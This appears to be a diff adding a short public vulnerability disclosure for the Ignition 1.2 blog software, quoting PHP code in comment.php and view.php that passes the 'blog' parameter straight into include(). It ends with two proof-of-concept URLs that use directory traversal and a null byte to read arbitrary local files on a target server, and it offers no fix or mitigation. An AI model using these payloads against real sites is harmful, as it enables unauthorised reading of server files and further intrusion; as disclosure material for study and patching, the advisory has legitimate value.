@@ -1,0 +1,33 @@
+Ignition 1.2 Multiple Local File Inclusion Vulnerabilities
+disclosed by cOndemned
+download: http://launchpadlibrarian.net/27567060/ignition_1.2.zip
+note: magic_quotes_gpc should be turned off in order to exploit this vulnerability
+greetz: all friends, SecurityReason team :)
+
+
+comment.php
+
+	1.	<?php 
+	2.	session_start();
+	3.	require ('settings.php');
+	4.	include ('posts/'.$_GET['blog'].'.txt');			# [1]
+	5.	?>
+
+
+view.php
+
+	1.	<?php
+	2.	session_start();
+	3.	require ('settings.php');
+	4.	$blog = $_GET['blog'];
+	5.	if (file_exists('posts/'.$_GET['blog'].'.txt')) {
+	6.	include ('posts/'.$_GET['blog'].'.txt');			# [2]
+	7.	}else{
+
+
+proof of concept:
+
+	[1] http://[attacked_box]/[ignition1.2]/comment.php?blog=../../../../[local_file]%00
+	[2] http://[attacked_box]/[ignition1.2]/view.php?blog=../../../../../[local_file]%00
+
+
